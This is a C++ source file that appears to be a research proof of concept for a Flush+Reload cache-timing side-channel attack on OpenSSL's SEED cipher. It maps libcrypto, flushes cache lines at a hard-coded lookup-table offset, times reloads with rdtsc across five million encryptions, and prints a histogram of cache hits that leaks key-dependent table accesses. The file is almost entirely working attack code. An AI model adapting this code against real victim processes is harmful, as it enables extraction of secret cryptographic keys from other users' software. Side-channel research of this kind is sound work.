#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include <map>
#include <vector>
#include <ctype.h>
#include <termios.h>
#include <sys/stat.h>
#include <sys/types.h>
# include <string.h>
# ifdef _WIN32
#  include <memory.h>
# endif
#include <openssl/seed.h>

#define NUMBER_OF_ENCRYPTIONS (5000000)

char* base;
char* end;


int main()
{
  int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  int cachehit[16][256];

  for (int i=0; i<16; i++) {
    for (int j=0; j<256; j++) {

      cachehit[i][j] = 0;

    }
  }

  unsigned char ciphertext[16];

  char* offset[] = {

base + 0x205dc0

  };

  const unsigned char userKey[16]={0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15} ;
  unsigned char plaintext[16];

  SEED_KEY_SCHEDULE kd;

  SEED_set_key(userKey,&kd);

    printf("\n");

    for(size_t k=0; k < NUMBER_OF_ENCRYPTIONS ;k++){

    for (size_t l = 0; l < 4; ++l)

    {

        sched_yield();

  flush(offset[0]+(64*l));

        sched_yield();

        for (size_t j = 0; j < 16; ++j)

          plaintext[j] = rand() % 256;

        sched_yield();

       SEED_encrypt(plaintext,ciphertext, &kd);

   sched_yield();

    size_t time1 = rdtsc();

    maccess(offset[0]+64*l);

    size_t time2 = rdtsc() - time1;

    sched_yield();

    if (time2 < 220) {

          for (size_t m=0;  m < 64; ++m){

      cachehit[0][plaintext[0]^plaintext[4]^(64 * l + m)]++;

    }

    }

}
    }

    sched_yield();

    for (size_t f = 0; f < 256; ++f)

     printf("%x,", cachehit[0][f]);

printf("\n");

sched_yield();

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}


